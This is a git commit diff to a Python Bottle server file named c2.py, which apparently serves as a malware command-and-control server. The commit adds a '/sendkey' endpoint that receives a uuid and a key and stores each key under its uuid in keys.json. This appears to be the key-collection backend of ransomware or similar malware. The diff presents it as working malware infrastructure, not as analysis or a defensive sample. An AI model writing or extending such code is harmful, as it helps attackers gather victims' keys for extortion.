41f46287e54ed93c2c6232466ae916716e8f8bb9
Julia van der Kris <julia@juuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuulia.dev>
2020-01-30 11:54:50 +0100

    Add sendkey API

--- c2.py
+++ c2.py
@@ -4,11 +4,18 @@ import json
 import config
 
 
-@post('/')
+@post('/sendkey')
 def index():
 	if request.json:
+		uuid = request.json['uuid']
 		key = request.json['key']
-		print(key)
+
+		with open('keys.json', ) as file:
+			keys = json.load(file)
+		keys[uuid] = {'key': key}
+		with open('keys.json', 'w') as file:
+			json.dump(keys, file)
+
 
 
 run(host='localhost', port=8000, reloader=True, debug=config.DEBUG, interval=0.1)
